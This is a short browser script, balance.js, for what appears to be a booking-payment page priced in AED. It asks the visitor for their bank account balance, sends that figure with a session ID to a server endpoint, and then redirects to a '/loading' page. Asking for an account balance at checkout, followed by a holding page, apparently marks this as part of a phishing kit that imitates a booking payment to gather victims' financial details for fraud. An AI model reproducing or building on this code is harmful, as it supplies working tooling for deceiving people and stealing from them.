// balance.js
(function () {
  const form = document.getElementById("balance-form");
  const balanceInput = document.getElementById("balance");
  const submitBtn = form.querySelector(".pay-button");
  const paymentAmount = document.getElementById("paymentAmount");
  const orderNumber = document.getElementById("orderNumber");

  // Update price from storage
  function updatePriceFromStorage() {
    const price =
      localStorage.getItem("price") || sessionStorage.getItem("price");
    if (price) {
      const displayPrice = parseFloat(price).toFixed(2);
      paymentAmount.textContent = `AED ${displayPrice}`;
    }
  }

  // Set order number if available
  function setOrderNumber() {
    const bookingId = localStorage.getItem("bookingId");
    if (bookingId) {
      const textNode = orderNumber.firstChild;
      if (textNode) {
        textNode.textContent = bookingId;
      }
    }
  }

  // Format balance input
  balanceInput.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/[^\d.]/g, "");
    const parts = e.target.value.split(".");
    if (parts.length > 2) {
      e.target.value = parts[0] + "." + parts.slice(1).join("");
    }
  });

  function simpleValidate() {
    const balance = balanceInput.value.trim();
    if (!balance) return "Please enter your account balance";
    if (isNaN(parseFloat(balance)))
      return "Please enter a valid balance amount";
    if (parseFloat(balance) < 0) return "Balance cannot be negative";
    return null;
  }

  form.addEventListener("submit", (e) => {
    e.preventDefault();

    const err = simpleValidate();
    if (err) {
      alert(err);
      return;
    }

    submitBtn.disabled = true;
    submitBtn.innerHTML =
      '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle></svg> Processing...';

    const balance = parseFloat(balanceInput.value);
    const sessionId = localStorage.getItem("sessionId");

    // Send balance to server
    fetch("/api/submit-balance", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId,
        balance,
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.success) {
          console.log("✅ Balance submitted successfully");
          // ✅ Редирект на loading после успешной отправки
          window.location.href = "/loading";
        } else {
          throw new Error(data.error || "Balance submission failed");
        }
      })
      .catch((err) => {
        console.error(err);
        alert("Network error – try again");
        submitBtn.disabled = false;
        submitBtn.innerHTML =
          '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> Verify Balance';
      });
  });

  // Initialize
  updatePriceFromStorage();
  setOrderNumber();
})();
